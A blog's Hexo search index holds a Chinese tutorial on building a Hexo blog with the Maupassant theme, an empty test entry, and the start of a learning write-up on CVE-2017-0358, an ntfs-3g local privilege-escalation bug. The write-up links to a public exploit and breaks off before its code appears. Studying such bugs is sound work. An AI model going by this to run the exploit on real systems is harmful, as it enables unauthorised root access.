<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Hexo &amp; Maupassant 博客搭建</title>
      <link href="/2018/10/21/Hexo-Maupassant-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/10/21/Hexo-Maupassant-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>沉淀对于成长意义重大，希望能够借助此博客，沉淀所学所思，记录成长的历程。<br><a id="more"></a></p><h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> 是一个基于 Node.js 的静态博客框架，具有极速生成静态页面、支持Markdown、一键部署、插件丰富等优点。在使用 Hexo 之前，需要进行以下准备工作。</p><ul><li>安装 Node.js，用以生成静态页面</li><li>安装 Git，用以提交管理博客</li><li>注册 Github 账号，并开启 Github Pages 服务  </li><li>掌握 Markdown 语法，用以管理站点内容 </li></ul><p>以上内容资料较为丰富，因此不再赘述，如有需求请自行 Google。</p><h2 id="0x01-Hexo"><a href="#0x01-Hexo" class="headerlink" title="0x01 Hexo"></a>0x01 Hexo</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><p>通过以下命令，一键安装 Hexo<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g</span><br></pre></td></tr></table></figure></p><p>待安装完成后，创建用以存放 hexo 文件的目录，并初始化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir hexo</span><br><span class="line"><span class="built_in">cd</span> hexo</span><br><span class="line">hexo init</span><br></pre></td></tr></table></figure></p><p>初始化成功后，目录结构如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">└── themes</span><br><span class="line"></span><br><span class="line">3 directories, 2 files</span><br></pre></td></tr></table></figure></p><h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2. 常用命令"></a>2. 常用命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server 开启hexo服务器</span><br><span class="line">$ hexo s</span><br><span class="line">$ hexo s --draft 显示草稿</span><br><span class="line"></span><br><span class="line">$ hexo new <span class="string">"name"</span> 新建文章</span><br><span class="line">$ hexo new draft <span class="string">"name"</span> 新建草稿</span><br><span class="line">$ hexo publish <span class="string">"name"</span> 发布草稿</span><br><span class="line"></span><br><span class="line">$ hexo clean 清除缓存文件 (db.json) 和已生成的静态文件 (public)</span><br><span class="line"></span><br><span class="line">$ hexo generate 生成静态页面</span><br><span class="line">$ hexo g</span><br><span class="line"></span><br><span class="line">$ hexo deploy 部署博客到Github</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><h3 id="3-Hexo-配置"><a href="#3-Hexo-配置" class="headerlink" title="3. Hexo 配置"></a>3. Hexo 配置</h3><p>通过<code>/_config.yml</code>文件可对 Hexo 进行配置，官方文档中有详细介绍，不再赘述，详情可参考<a href="https://hexo.io/zh-cn/docs/configuration" target="_blank" rel="noopener">配置</a>。</p><h3 id="4-添加文章摘要"><a href="#4-添加文章摘要" class="headerlink" title="4. 添加文章摘要"></a>4. 添加文章摘要</h3><p>设置文章摘要有两种方法：</p><ul><li>在 Front-matter 中指定 description，如：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">title: Hello World</span><br><span class="line">date: 2013-11-22 17:11:54</span><br><span class="line">description: 你对本页的描述</span><br><span class="line">```  </span><br><span class="line">* 在正文使用 `&lt;!--more--&gt;` 作为摘要的结束标记</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">以上是摘要  </span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line">以下是剩下的全文</span><br></pre></td></tr></table></figure><h3 id="5-自定义-404-、about-页面"><a href="#5-自定义-404-、about-页面" class="headerlink" title="5. 自定义 404 、about 页面"></a>5. 自定义 404 、about 页面</h3><ul><li>在 <code>hexo/source</code> 目录下创建 <code>404.html</code> 文件 或者 <code>404.md</code> 文件，以 404.html 为例接入<a href="http://www.qq.com/404/" target="_blank" rel="noopener">腾讯404公益广告</a>。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">layout: false</span><br><span class="line">title: "404"</span><br><span class="line">---</span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html;charset=utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">homePageUrl</span>=<span class="string">"http://&lt;your home page&gt;"</span> <span class="attr">homePageName</span>=<span class="string">"回到首页"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>在 <code>hexo/source/about/</code> 目录下创建 <code>index.md</code>文件，添加内容如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: about </span><br><span class="line">---</span><br><span class="line">Coming soon ~</span><br><span class="line">```  </span><br><span class="line"> </span><br><span class="line"><span class="comment">### 6. 创建分类及标签  </span></span><br><span class="line">6.1 创建“分类”选项</span><br><span class="line">打开命令行，进入博客所在目录。执行以下命令</span><br><span class="line">```bash</span><br><span class="line">$ hexo new page NewCategories</span><br></pre></td></tr></table></figure><p>成功后提示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  Created: ~/Documents/blog/<span class="built_in">source</span>/NewCategories/index.md</span><br></pre></td></tr></table></figure></p><p>生成的<code>index.md</code>内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>向文件中添加<code>type: &quot;categories&quot;</code>，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line"><span class="built_in">type</span>: <span class="string">"categories"</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: jQuery对表单的操作及更多应用</span><br><span class="line">date: 2018-10-20 13:47:40</span><br><span class="line">categories: </span><br><span class="line">- web前端</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><p>6.2 创建“标签”选项<br>打开命令行，进入博客所在文件夹。执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page NewTags</span><br></pre></td></tr></table></figure></p><p>成功后会提示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  Created: ~/Documents/blog/<span class="built_in">source</span>/NewTags/index.md</span><br></pre></td></tr></table></figure></p><p>打开<code>index.md</code>文件，内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2017-05-27 14:22:08</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>添加<code>type: &quot;tags&quot;</code>至<code>index.md</code>中：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2017-05-27 13:47:40</span><br><span class="line"><span class="built_in">type</span>: <span class="string">"tags"</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>打开需要添加标签的文章，为其添加tags属性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: jQuery对表单的操作及更多应用</span><br><span class="line">date: 2017-05-26 12:12:57</span><br><span class="line">categories: </span><br><span class="line">- web前端</span><br><span class="line">tags:</span><br><span class="line">- jQuery</span><br><span class="line">- 表格</span><br><span class="line">- 表单验证</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>至此，成功给文章添加标签，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><p>修改<code>scaffolds/post.md</code>模板文件，在 Front-matter 区域添加<code>tages:</code>、<code>categories:</code>：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>之后执行<code>hexo new 文章名</code>命令生成的文件，将会自动添加“分类”与“标签”。</p><h3 id="7-SEO优化"><a href="#7-SEO优化" class="headerlink" title="7. SEO优化"></a>7. SEO优化</h3><p>Hexo 站点已基本搭建完成。但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，若想要加入搜索引擎收录，需进行 SEO 优化。<br>7.1 添加搜索引擎收录<br>分别在 <a href="http://zhanzhang.baidu.com/site/index" target="_blank" rel="noopener">百度站长工具</a> 和 <a href="https://www.google.com/webmasters/tools/home?hl=zh-CN" target="_blank" rel="noopener">Google 站长工具</a> 中对站点进行验证。</p><p>选择<code>文件验证</code>的方式进行验证，把下载的文件放在 <code>source</code> 目录下，并对文件内容进行编辑，在文件首部加入如下内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: <span class="literal">false</span></span><br><span class="line">sitemap: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>这样就可以防止 Hexo 在生成博客网站时在验证文件里添加额外的内容，导致验证失败。<br>也可以在博客的配置文件里加入如下的配置来防止这些文件被渲染：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">skip_render:</span><br><span class="line"> - baidu_verify*.html</span><br><span class="line"> - google*.html</span><br></pre></td></tr></table></figure></p><p>7.2 添加robots.txt<br>在/source/下新建robots.txt：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Allow: /about/</span><br><span class="line">Allow: /categories/</span><br><span class="line">Allow: /donate/</span><br><span class="line">Allow: /2017/</span><br><span class="line">Allow: /<span class="built_in">history</span>/</span><br><span class="line">Allow: /message/</span><br><span class="line">Allow: /page/</span><br><span class="line">Allow: /tags/</span><br><span class="line"></span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /fancybox/</span><br><span class="line"></span><br><span class="line">Sitemap: https://domain/sitemap.xml</span><br><span class="line">Sitemap: https://domain/baidusitemap.xml</span><br></pre></td></tr></table></figure></p><p>7.3 提交 sitemaps<br>利用插件生成sitemap（详见下文），待站点验证成功后便可以选择用 sitemap 的方式自动提交链接。<br>提交完成后可以通过 site:your-blog-site 验证站点是否被百度、Google 收录。 一般需要几天的时间才能保证被搜索引擎收录。</p><h2 id="0x02-Maupassant"><a href="#0x02-Maupassant" class="headerlink" title="0x02 Maupassant"></a>0x02 Maupassant</h2><p>Hexo官网提供了丰富的 <a href="https://hexo.io/themes/" target="_blank" rel="noopener">Themes</a>，选定心仪的主题之后，可以参照主题的文档进行安装，之后修改<code>/_conifg.yml</code>进行配置，本站选用了Maupassant。<br><img src="https://www.haomwei.com/images/maupassant.jpg" alt="主题效果">  </p><h3 id="1-Maupassant-安装"><a href="#1-Maupassant-安装" class="headerlink" title="1. Maupassant 安装"></a>1. Maupassant 安装</h3><p>安装主题和渲染器：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/tufu9441/maupassant-hexo.git themes/maupassant</span><br><span class="line">$ npm install hexo-renderer-pug --save</span><br><span class="line">$ npm install hexo-renderer-sass --save</span><br></pre></td></tr></table></figure></p><p>编辑Hexo目录下的 <code>_config.yml</code>，将<code>theme</code>的值改为<code>maupassant</code>。</p><p><strong>注：安装<code>npm install hexo-renderer-sass</code>时报错，切换至<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝NPM镜像</a>安装即可。</strong></p><h3 id="2-Maupassant配置"><a href="#2-Maupassant配置" class="headerlink" title="2. Maupassant配置"></a>2. Maupassant配置</h3><p>官方文档中有详细介绍，可参考<a href="https://www.haomwei.com/technology/maupassant-hexo.html" target="_blank" rel="noopener">中文介绍</a>。</p><h3 id="3-显示文章目录"><a href="#3-显示文章目录" class="headerlink" title="3. 显示文章目录"></a>3. 显示文章目录</h3><p>在文章的 <a href="https://hexo.io/docs/front-matter.html#Settings_&amp;_Their_Default_Values" target="_blank" rel="noopener">Front-matter</a> 中添加<code>toc: true</code>就可以让该篇文章显示目录，可以修改 <code>hexo/scaffolds/post.md</code> 模板文件，这样之后创建的文章默认都显示文章目录。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">categories:</span><br><span class="line">tags:</span><br><span class="line">toc: <span class="literal">true</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><h3 id="4-开启-canvas-nest-网页动态背景"><a href="#4-开启-canvas-nest-网页动态背景" class="headerlink" title="4. 开启 canvas-nest 网页动态背景"></a>4. 开启 canvas-nest 网页动态背景</h3><p>修改<code>/themes/maupassant/_config.yml</code>:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span> </span><br><span class="line"><span class="attr">  color:</span> <span class="number">208</span><span class="string">,55,66</span> <span class="comment">## RGB value of the color</span></span><br><span class="line"><span class="attr">  opacity:</span> <span class="number">0.3</span> <span class="comment">## Transparency of lines</span></span><br><span class="line"><span class="attr">  zIndex:</span> <span class="bullet">-1</span> <span class="comment">## The z-index property of the background</span></span><br><span class="line"><span class="attr">  count:</span> <span class="number">99</span> <span class="comment">## Quantity of lines</span></span><br></pre></td></tr></table></figure></p><h3 id="5-设置导航栏menu"><a href="#5-设置导航栏menu" class="headerlink" title="5. 设置导航栏menu"></a>5. 设置导航栏menu</h3><p>修改<code>/themes/maupassant/_config.yml</code>:<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">home</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">.</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-home</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">archive</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">archives/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-archive</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">about</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">about/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-user</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">history</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">history/</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-user</span></span><br><span class="line"><span class="attr">  - page:</span> <span class="string">rss</span></span><br><span class="line"><span class="attr">    directory:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">    icon:</span> <span class="string">fa-rss</span></span><br></pre></td></tr></table></figure></p><h3 id="6-为导航添加相应的页面（时间轴等）"><a href="#6-为导航添加相应的页面（时间轴等）" class="headerlink" title="6. 为导航添加相应的页面（时间轴等）"></a>6. 为导航添加相应的页面（时间轴等）</h3><ul><li>在/source下新建与page名称对应的文件夹，然后在文件夹中建立<code>index.md</code>文件；</li><li>在<code>index.md</code>的<code>front-matter</code>中设置属性，若需要含有侧边栏的页面，添加<code>layout: page</code>；若需要单栏页面，就将layout设置为 <code>layout: single-column</code>；若不需要评论，需要加上<code>comments: false</code></li><li>若要显示时间轴，在index.md的front-matter中设置layout属性为<code>layout: timeline</code>，同时修改<code>/themes/maupassant/_config.yml</code>:  </li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">timeline:</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2014</span><span class="string">/06/12-Start</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2014</span><span class="string">/11/29-XXX</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">3</span></span><br><span class="line"><span class="attr">    word:</span> <span class="number">2015</span><span class="string">/02/18-DDD</span></span><br><span class="line"><span class="attr">  - num:</span> <span class="number">4</span></span><br><span class="line"><span class="attr">    word:</span> <span class="string">More</span></span><br></pre></td></tr></table></figure><p>/source/history/index.md：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: timeline</span><br><span class="line">comments: <span class="literal">false</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><h2 id="0x03-常用插件"><a href="#0x03-常用插件" class="headerlink" title="0x03 常用插件"></a>0x03 常用插件</h2><h3 id="1-hexo-wordcount"><a href="#1-hexo-wordcount" class="headerlink" title="1. hexo-wordcount"></a>1. hexo-wordcount</h3><p>安装插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-wordcount —save</span><br></pre></td></tr></table></figure></p><p>开启 Maupassant 主题中的 Word Count 功能：<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">wordcount:</span> <span class="literal">true</span> <span class="comment">## If you want to display the word counter and the reading time expected to spend of each post please set the value to true, and you must have hexo-wordcount installed.</span></span><br></pre></td></tr></table></figure></p><h3 id="2-hexo-generator-search"><a href="#2-hexo-generator-search" class="headerlink" title="2. hexo-generator-search"></a>2. hexo-generator-search</h3><p>启用 Maupassant 本地搜索功能，安装<a href="https://github.com/PaicHyperionDev/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure></p><p>安装完成后，修改主题配置，显示本地搜索框<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">self_search:</span> <span class="literal">true</span> <span class="comment">## Use a jQuery-based local search engine, true/false.</span></span><br></pre></td></tr></table></figure></p><h3 id="3-hexo-asset-image"><a href="#3-hexo-asset-image" class="headerlink" title="3. hexo-asset-image"></a>3. hexo-asset-image</h3><p>hexo对本地图片的支持并不友好，如果按markdown的语法写部署之后页面的图片取不到，如果按hexo的写法在本地markdown编辑器中又不能识别，解决办法是使用 hexo-asset-image 插件。<br>首先安装插件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-asset-image —save</span><br></pre></td></tr></table></figure></p><p>然后修改 <code>_config.yml</code> 中 <code>post_asset_folder</code> 的值为 <code>true</code>，这样每次创建文章的时候会生成一个同名文件夹用于放资源文件，这样就可以使用markdown的语法来插入图片了。</p><h3 id="4-hero-generator-feed"><a href="#4-hero-generator-feed" class="headerlink" title="4. hero-generator-feed"></a>4. hero-generator-feed</h3><p>支持 RSS 订阅，安装 hexo-generator-feed<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure></p><p>修改 hexo 配置<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">feed:</span></span><br><span class="line"><span class="attr">    type:</span> <span class="string">atom</span></span><br><span class="line"><span class="attr">    path:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">    limit:</span> <span class="number">5</span> <span class="comment">#在feed中出现的最大文章数（使用0或者false）来显示所有文章</span></span><br><span class="line"><span class="attr">    hub:</span></span><br><span class="line"><span class="attr">    content:</span></span><br></pre></td></tr></table></figure></p><p>修改主题配置<br><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">- page:</span> <span class="string">rss</span></span><br><span class="line"><span class="attr">  directory:</span> <span class="string">atom.xml</span></span><br><span class="line"><span class="attr">  icon:</span> <span class="string">fa-rss</span></span><br></pre></td></tr></table></figure></p><h3 id="5-生成站点地图"><a href="#5-生成站点地图" class="headerlink" title="5. 生成站点地图"></a>5. 生成站点地图</h3><p>通过站点地图生成插件生成sitemap，进行SEO优化。</p><ul><li>安装插件  </li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save</span><br></pre></td></tr></table></figure><ul><li>生成站点地图,修改<code>/_config.yml</code>文件，添加如下配置：</li></ul><pre><code class="yml"><span class="comment"># 自动生成sitemap</span><span class="attr">sitemap:</span><span class="attr">    path:</span> <span class="string">sitemap.xml</span><span class="attr">baidusitemap:</span><span class="attr">    path:</span> <span class="string">baidusitemap.xml</span></code></pre><p>编译<code>hexo g</code>，在 public 目录下可以看到sitemap.xml和baidusitemap.xml文件，重新发布至服务器<code>hexo d</code>。</p><h2 id="0x04-未完待续"><a href="#0x04-未完待续" class="headerlink" title="0x04 未完待续"></a>0x04 未完待续</h2><ol><li>待站点被收录后，上传sitemap.xml；</li><li>显示分类文章总数(目测有难度)</li><li>开启评论</li></ol>]]></content>
      
      
      <categories>
          
          <category> 原创 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ATO_Test</title>
      <link href="/2018/10/21/ATO-Test/"/>
      <url>/2018/10/21/ATO-Test/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> ATO-ThreatIntelligence </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSINT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-0358</title>
      <link href="/2018/10/21/CVE-2017-0358/"/>
      <url>/2018/10/21/CVE-2017-0358/</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-0358，Linux本地提权漏洞。<br><a id="more"></a></p><h2 id="0x00-ntfs-3g-Debian-9-Privilege-Escalation"><a href="#0x00-ntfs-3g-Debian-9-Privilege-Escalation" class="headerlink" title="0x00 ntfs-3g (Debian 9) - Privilege Escalation"></a>0x00 ntfs-3g (Debian 9) - Privilege Escalation</h2><hr><p>　　最近研究了下CVE-2017-0358，Linux下的本地提权漏洞，记录下学习历程。最初是在exploit-db上发现该漏洞<a href="https://www.exploit-db.com/exploits/41240/" target="_blank" rel="noopener">ntfs-3g (Debian 9) - Privilege Escalation</a>，并附有EXP，在简单学习了FUSE、NTFS-3G等基础概念后尝试利用作者给出的EXP复现漏洞。<br>EXP如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 